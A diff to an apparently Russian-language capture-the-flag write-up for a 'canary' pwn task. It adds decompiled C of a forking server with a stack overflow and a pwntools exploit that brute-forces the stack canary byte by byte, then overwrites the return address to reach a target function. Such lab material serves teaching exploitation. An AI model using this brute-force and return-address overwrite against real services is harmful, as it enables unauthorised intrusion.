@@ -4,11 +4,82 @@ Hi! This is your [binary](https://pwn.spbctf.ru/files/canary/task_spooner)
 nc 109.233.56.90 11591
 
 Необходимо при помощи брутфорса получить канарейку.
-![{BBFED6CD-1426-4841-9401-6242F99B9B72}](../../../../z.%20Images/{BBFED6CD-1426-4841-9401-6242F99B9B72}.png)
-![{574CE984-F218-42C6-839B-106A40B12923}](../../../../z.%20Images/{574CE984-F218-42C6-839B-106A40B12923}.png)
+``` C
+{
+  while ( 1 )
+  {
+    addr_len = 16;
+    client = accept(fd, &s, &addr_len);
+    if ( client != -1 )
+      break;
+    perror("accept");
+  }
+  if ( !fork() )
+  {
+    current_fd = client;
+    alarm(5u);
+    handler(client);
+    send(client, "Bye!", 5u, 0);
+    exit(0);
+  }
+  close(client);
+}
 
-Солвер:
-![{6DAB4B74-83ED-49BB-A426-630F03752282}](../../../../z.%20Images/{6DAB4B74-83ED-49BB-A426-630F03752282}.png)
+unsigned __int64 __fastcall handler(int client)
+{
+  int count; // [rsp+10h] [rbp-A0h]
+  char nptr[10]; // [rsp+16h] [rbp-9Ah] BYREF
+  _BYTE bufer[136]; // [rsp+20h] [rbp-90h] BYREF
+  unsigned __int64 canary; // [rsp+A8h] [rbp-8h]
+
+  canary = __readfsqword(0x28u);
+
+  send(client, "Length of data: ", 17u, 0);
+  read_n((unsigned int)client, nptr, 10);
+  count = atoi(nptr);
+  if ( count > 0 )
+    read_n((unsigned int)client, bufer, (unsigned int)count);
+
+  return __readfsqword(0x28u) ^ canary;
+}
+```
+
+Эксплоит:
+``` python
+def get_canary():
+    canary = b'\x00'
+    for _ in range(7):
+        for b in range(256):
+            io = start()
+            io.recvuntil(b"data: ")
+
+            payload = b'A' * 136 + canary + bytes([b])
+            io.sendline(str(len(payload)).encode())
+            io.send(payload)
+
+            try:
+                if b'Bye!' in io.recvall(timeout=0.15):
+                    canary += bytes([b])
+                    print(f"Current: {canary.hex()}")
+                    io.close()
+                    break
+            except EOFError:
+                pass
+
+            print('Try:' + canary.hex() + ' ' + bytes([b]).hex())
+            io.close()
+    return canary
+
+canary = get_canary()
+
+io = start()
+
+io.recvuntil(b"data: ")
+payload = b'A' * 136 + canary + b'B' * 8 + p64(0x400B2A)
+io.sendline(payload)
+
+io.interactive()
+```
 
 Запуск:
 ![{B0E4A142-1FAC-4D35-87E4-0379FFC2F553}](../../../../z.%20Images/{B0E4A142-1FAC-4D35-87E4-0379FFC2F553}.png)
